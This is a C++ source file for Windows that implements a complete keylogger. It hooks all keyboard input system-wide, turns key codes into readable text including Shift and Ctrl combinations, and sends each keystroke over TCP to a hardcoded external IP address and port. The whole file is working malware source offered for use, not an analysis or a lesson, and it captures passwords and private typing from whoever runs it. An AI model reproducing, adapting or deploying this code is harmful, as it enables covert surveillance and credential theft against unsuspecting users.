#include "keyboard.h"

VOID HandleVirtualKeyCode(DWORD vCode, UINT time, BOOL Combination = FALSE)
{
	//		https://docs.microsoft.com/zh-cn/windows/win32/inputdev/virtual-key-codes

	ZeroMemory(singleChar, 10);
	//ZeroMemory(nowDateTime, 32);

	msgTime = time / 1000 + systemRunTime;

	/*
	nowTime = (time_t)(time / 1000 + systemRunTime);
	tm = *localtime(&nowTime);
	strftime(nowDateTime, 32, "%H:%M:%S => ", &tm);

	if (oldDay < tm.tm_mday)	//	如果过了一天，日志文件要对应更新
	{
		oldDay = tm.tm_mday;
		strftime(logFileName, 64, "C:\\Windows\\Temp\\keyboard_%Y_%m_%d.log", &tm);
	}
	*/
	//	英文字符
	if (vCode >= 0x41 && vCode <= 0x5A)	//对应ASCII大写字母
	{
		*singleChar = (__KeyDownCaps == TRUE) ? vCode : vCode + 32;	//	__KeyDownCaps == TRUE	大写
		*singleChar = (__KeyDownShift == FALSE) ? *singleChar : (*singleChar > 0x5A) ? *singleChar - 32 : *singleChar + 32;	// __KeyDownShift == TRUE	大小写互换
	}
	//	数字键
	else if (vCode >= 0x30 && vCode <= 0x39)	//对应ASCII中的数字
	{
		*singleChar = (__KeyDownShift == FALSE) ? vCode : shiftNumTable[vCode - 0x30];
	}
	//	小数字键盘
	else if (vCode >= 0x60 && vCode <= 0x69)
	{
		*singleChar = vCode - 0x30;
	}
	//F1-F12
	else if (vCode >= 0x70 && vCode <= 0x7B)
	{
		singleChar[0] = '[';
		singleChar[1] = 'F';
		if (vCode <= 0x78)	//F1 - F9
		{
			singleChar[2] = vCode - 0x3F;
			singleChar[3] = ']';
		}
		else	//F10 - F12
		{
			singleChar[2] = '1';
			singleChar[3] = vCode - 0x49;
			singleChar[4] = ']';
		}
	}
	else
	{
		switch (vCode)
		{
			/* 小键盘 => 加减乘除 和 下面的 . */
		case VK_ADD: *singleChar = '+'; break;
		case VK_SUBTRACT: *singleChar = '-'; break;
		case VK_MULTIPLY: *singleChar = '*'; break;
		case VK_DIVIDE: *singleChar = '/'; break;
		case VK_DECIMAL: *singleChar = '.'; break;	//按下SHIFT属于控制字符[DEL]

			/* 包含键盘左上角 ` 以及键盘回车附近的6个字符 */
		case VK_OEM_3: *singleChar = (__KeyDownShift == FALSE) ? '`' : '~'; break;
		case VK_OEM_4: *singleChar = (__KeyDownShift == FALSE) ? '[' : '{'; break;
		case VK_OEM_6: *singleChar = (__KeyDownShift == FALSE) ? ']' : '}'; break;
		case VK_OEM_5: *singleChar = (__KeyDownShift == FALSE) ? '\\' : '|'; break;
		case VK_OEM_1: *singleChar = (__KeyDownShift == FALSE) ? ';' : ':'; break;
		case VK_OEM_7: *singleChar = (__KeyDownShift == FALSE) ? '\'' : '"'; break;
		case VK_OEM_2: *singleChar = (__KeyDownShift == FALSE) ? '/' : '?'; break;

			/*	字母M键右边的 ,和. */
		case VK_OEM_COMMA: *singleChar = (__KeyDownShift == FALSE) ? ',' : '<'; break;
		case VK_OEM_PERIOD: *singleChar = (__KeyDownShift == FALSE) ? '.' : '>'; break;
			/*  数字键盘右边的 -和= */
		case VK_OEM_PLUS: *singleChar = (__KeyDownShift == FALSE) ? '=' : '+'; break;
		case VK_OEM_MINUS: *singleChar = (__KeyDownShift == FALSE) ? '-' : '_'; break;
			/*	不可显示字符	*/
		case VK_ESCAPE: strcpy(singleChar, "[ESC]"); break;
		case VK_TAB: strcpy(singleChar, "[TAB]"); break;
		case VK_CAPITAL: __KeyDownCaps ^= TRUE; strcpy(singleChar, "[CAPS]"); break;
		case VK_LSHIFT: strcpy(singleChar, "[Shift]"); break;
		case VK_RSHIFT: strcpy(singleChar, "[Shift]"); break;
		case VK_LCONTROL: strcpy(singleChar, "[Ctrl]"); break;
		case VK_RCONTROL: strcpy(singleChar, "[Ctrl]"); break;
		case VK_LWIN: strcpy(singleChar, "[Win]"); break;
		case VK_RWIN: strcpy(singleChar, "[Win]"); break;
		case VK_LMENU: strcpy(singleChar, "[AIt]"); break;
		case VK_RMENU: strcpy(singleChar, "[AIt]"); break;
		case VK_SPACE: strcpy(singleChar, "[Space]"); break;
		case VK_RETURN: strcpy(singleChar, "[Enter]"); break;
		case VK_BACK: strcpy(singleChar, "[Back]"); break;
		case VK_APPS: strcpy(singleChar, "[Apps]"); break;

			/*小键盘左边13个控制键*/
		case VK_SNAPSHOT: strcpy(singleChar, "[PrtSc]"); break;
		case VK_SCROLL: strcpy(singleChar, "[ScrLk]"); break;
		case VK_PAUSE: strcpy(singleChar, "[Pause]"); break;
		case VK_INSERT: strcpy(singleChar, "[Insert]"); break;
		case VK_DELETE: strcpy(singleChar, "[Delete]"); break;
		case VK_HOME: strcpy(singleChar, "[Home]"); break;
		case VK_END: strcpy(singleChar, "[End]"); break;
		case VK_PRIOR: strcpy(singleChar, "[PgUp]"); break;
		case VK_NEXT: strcpy(singleChar, "[PgDn]"); break;
		case VK_UP: strcpy(singleChar, "[↑]"); break;
		case VK_DOWN: strcpy(singleChar, "[↓]"); break;
		case VK_LEFT: strcpy(singleChar, "[←]"); break;
		case VK_RIGHT: strcpy(singleChar, "[→]"); break;

		case VK_CLEAR: strcpy(singleChar, "[Clear]"); break;
		case VK_NUMLOCK: strcpy(singleChar, "[NumLk]"); break;

		}
	}

	if (Combination == FALSE)	//不是组合键
	{
		if (singleChar[0] == 0)
		{
			//strcpy(singleChar, "[NULL]");
			//cout << "无法识别的字符-> " << vCode << endl;
		}
		else
		{
			//cout << "单个字符-> " << nowDateTime << ":::" << singleChar << endl;
			//strcat(nowDateTime, singleChar);
			//WriteLogToFile(logFileName, nowDateTime);
			procKeyStrFun(singleChar, msgTime);
		}
		return;
	}
	else	//是组合键
	{
		if (controlKeyList.size() == 1)
		{
			DWORD controlKey = controlKeyList.back();
			if ((controlKey == 0xA0 || controlKey == 0xA1) && singleChar[1] == 0)	//	SHIFT + 可以显示的字符
			{
				//cout << "单个SHIFT字符-> " << singleChar << endl;
				//strcat(nowDateTime, singleChar);
				//WriteLogToFile(logFileName, nowDateTime);
				procKeyStrFun(singleChar, msgTime);
				return;
			}
		}

		keyStr.clear();

		for (list<DWORD>::const_iterator iter = controlKeyList.begin(); iter != controlKeyList.end(); iter++)
		{
			switch (*iter)
			{
			case VK_LCONTROL: keyStr += "[Ctrl] + "; break;
			case VK_RCONTROL: keyStr += "[Ctrl] + "; break;
			case VK_LMENU: keyStr += "[AIt] + "; break;
			case VK_RMENU: keyStr += "[AIt] + "; break;
			case VK_LWIN: keyStr += "[Win] + "; break;
			case VK_RWIN: keyStr += "[Win] + "; break;
			case VK_LSHIFT: keyStr += "[SHIFT] + "; break;
			case VK_RSHIFT: keyStr += "[SHIFT] + "; break;
			}

		}
		keyStr += singleChar;

		controlKeyList.clear();

		//cout << "组合字符-> " << keyStr << endl;

		//keyStr = nowDateTime + keyStr;
		//WriteLogToFile(logFileName, (CHAR*)keyStr.c_str());

		procKeyStrFun((CHAR*)keyStr.c_str(), msgTime);

	}

}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{

	if (nCode < 0) return CallNextHookEx(NULL, nCode, wParam, lParam);

	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;

	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)	//	当按下一个按键的时候
	{
		if (p->vkCode >= 0xA0 && p->vkCode <= 0xA5 || p->vkCode == 0x5B || p->vkCode == 0x5C)	//控制键
		{
			if (!(!controlKeyList.empty() && p->vkCode == controlKeyList.back()))	//	由于控制键要存列表，这里不重复
			{
				controlKeyList.push_back(p->vkCode);
				if (p->vkCode == 0xA0 || p->vkCode == 0xA1)	//	SHIFT
				{
					__KeyDownShift = TRUE;

				}
			}
		}
		else
		{
			if (controlKeyList.empty())	//非组合按键，不需要存列表
			{
				HandleVirtualKeyCode(p->vkCode, p->time);
			}
			else	//组合按键
			{
				HandleVirtualKeyCode(p->vkCode, p->time, TRUE);
			}
		}
	}
	else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)	//	当松开一个按键的时候
	{
		if (p->vkCode >= 0xA0 && p->vkCode <= 0xA5 || p->vkCode == 0x5B || p->vkCode == 0x5C)	//松开控制键
		{
			UCHAR controlKeyListSize = controlKeyList.size();
			if (controlKeyListSize > 0)
			{
				if (controlKeyListSize == 1)	//	单个控制键
				{
					DWORD controlKey = controlKeyList.back();
					if (controlKey == 0xA0 || controlKey == 0xA1)	//	松开SHIFT
					{
						__KeyDownShift = FALSE;
					}
					else
					{
						HandleVirtualKeyCode(p->vkCode, p->time);	//输入单个控制字符
					}
					controlKeyList.pop_back();
				}
				else //松开时 存在多个控制键，例如Shift + TAB
				{
					HandleVirtualKeyCode(p->vkCode, p->time, TRUE);	//组合按键
				}
			}

		}
	}

	return disableKeyBoard;
}

BOOL OnHookKeyBoard(processKeyString procKeyStrFunction)
{

	procKeyStrFun = procKeyStrFunction;

	systemRunTime = time(NULL) - GetTickCount64() / 1000;

	nowTime = (time_t)time(NULL);
	tm = *localtime(&nowTime);

	//strftime(logFileName, 64, "C:\\Windows\\Temp\\keyboard_%Y_%m_%d.log", &tm);
	//oldDay = tm.tm_mday;

	keyboardHook = SetWindowsHookExW(
		WH_KEYBOARD_LL,
		LowLevelKeyboardProc,
		GetModuleHandleA(NULL),
		NULL
	);

	if (keyboardHook == NULL)
	{
		//cout << "Keyboard hook failed." << endl;
		return FALSE;
	}

	__KeyDownCaps = (BOOL)GetKeyState(VK_CAPITAL);	//初始化Caps状态

	MSG msg;

	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return TRUE;
}

VOID UnHookKeyBoard()
{
	UnhookWindowsHookEx(keyboardHook);
}

SOCKET sock;

VOID filter(CHAR* strKey)	//	对按键输出进行过滤
{
	string strBuf;

    if (!strcmp(strKey, "[Space]")) {
        strcpy(strKey, " ");
    }
    else if (!strcmp(strKey, "[Enter]")) {
        strcpy(strKey, "\r\n");
    }
    else if (strKey[0] == '[' && strKey[1] != '\0') //其它控制键,换行输出
    {
        strBuf.clear();
        strBuf = strKey;
        strBuf = "\n" + strBuf + "\n";
		if (send(sock, strBuf.c_str(), strBuf.length(), 0) <= 0)
		{
			UnHookKeyBoard();
			exit(1);
		}
        strKey[0] = '\0';
    }
}


VOID ProcKey(CHAR* strKey, UINT time)	//	回调函数，用来向服务器发送信息
{
    filter(strKey);
    if (*strKey != 0)
    {
		if (send(sock, strKey, strlen(strKey), 0) <= 0)
		{
			UnHookKeyBoard();
			exit(1);
		}
    }
}


#define SERVER_HOST "124.221.239.149"
#define SERVER_PORT 7788

INT socketInit(int nRetry = 5)	// 初始化Socket
{
    WSADATA wsaData;
    
    sockaddr_in addr;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    addr.sin_family = AF_INET;

    addr.sin_addr.S_un.S_addr = inet_addr(SERVER_HOST);
    addr.sin_port = htons(SERVER_PORT);

	for (int i = 0; i < nRetry; i++)
	{
		if (connect(sock, (sockaddr*)&addr, sizeof(sockaddr)) == 0)
			return 0;
		Sleep(5000);
	}
	return 1;
}


int main()
{
    if (socketInit() != 0)
    {
		//MessageBoxW(0, L"SOCKET 连接失败!", L"MSG", MB_OK | MB_ICONWARNING);
        return 1;
    }

    OnHookKeyBoard(ProcKey);

}
